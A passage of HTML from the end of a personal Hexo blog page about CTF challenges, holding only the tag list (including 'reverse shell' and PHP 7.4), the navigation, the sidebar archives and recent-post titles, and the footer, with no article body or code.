  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RCTF/">RCTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/disk/">disk</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php7-4/">php7.4</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/反弹shell/">反弹shell</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/06/03/CSAPP-buflab/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          CSAPP-buflab
        
      </div>
    </a>
  
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/802-11/">802.11</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSAPP/">CSAPP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cybrics/">Cybrics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ELF/">ELF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Jarvisoj/">Jarvisoj</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OS/">OS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCTF/">RCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rabin/">Rabin</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ruby/">Ruby</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SCTF/">SCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SMTP/">SMTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/">SSTI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XML/">XML</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/">XXE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ciscn/">ciscn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/disk/">disk</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jwt/">jwt</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/make/">make</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php7-4/">php7.4</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qwb/">qwb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/smarty3-1-30/">smarty3.1.30</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/thinkphp/">thinkphp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ucore/">ucore</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unserialize/">unserialize</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wireshark/">wireshark</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/反弹shell/">反弹shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件包含/">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/缓冲区溢出/">缓冲区溢出</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/802-11/" style="font-size: 10px;">802.11</a> <a href="/tags/CSAPP/" style="font-size: 10px;">CSAPP</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Cybrics/" style="font-size: 10px;">Cybrics</a> <a href="/tags/ELF/" style="font-size: 10px;">ELF</a> <a href="/tags/Jarvisoj/" style="font-size: 10px;">Jarvisoj</a> <a href="/tags/OS/" style="font-size: 10px;">OS</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/RCTF/" style="font-size: 10px;">RCTF</a> <a href="/tags/RSA/" style="font-size: 10px;">RSA</a> <a href="/tags/Rabin/" style="font-size: 10px;">Rabin</a> <a href="/tags/Ruby/" style="font-size: 10px;">Ruby</a> <a href="/tags/SCTF/" style="font-size: 10px;">SCTF</a> <a href="/tags/SMTP/" style="font-size: 10px;">SMTP</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/XML/" style="font-size: 10px;">XML</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/ciscn/" style="font-size: 10px;">ciscn</a> <a href="/tags/disk/" style="font-size: 10px;">disk</a> <a href="/tags/jwt/" style="font-size: 10px;">jwt</a> <a href="/tags/make/" style="font-size: 10px;">make</a> <a href="/tags/php7-4/" style="font-size: 10px;">php7.4</a> <a href="/tags/qwb/" style="font-size: 10px;">qwb</a> <a href="/tags/smarty3-1-30/" style="font-size: 10px;">smarty3.1.30</a> <a href="/tags/thinkphp/" style="font-size: 10px;">thinkphp</a> <a href="/tags/ucore/" style="font-size: 10px;">ucore</a> <a href="/tags/unserialize/" style="font-size: 10px;">unserialize</a> <a href="/tags/wireshark/" style="font-size: 10px;">wireshark</a> <a href="/tags/反弹shell/" style="font-size: 10px;">反弹shell</a> <a href="/tags/文件包含/" style="font-size: 10px;">文件包含</a> <a href="/tags/缓冲区溢出/" style="font-size: 10px;">缓冲区溢出</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/12/14/tps/">thinkphps</a>
          </li>
        
          <li>
            <a href="/2019/11/16/smarty/">smarty</a>
          </li>
        
          <li>
            <a href="/2019/11/10/ucore-lab1/">ucore-lab1</a>
          </li>
        
          <li>
            <a href="/2019/07/29/XXE/">XXE原理及实现</a>
          </li>
        
          <li>
            <a href="/2019/07/25/RSA-Rabin/">RSA_Rabin</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 WenWei Zeng<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>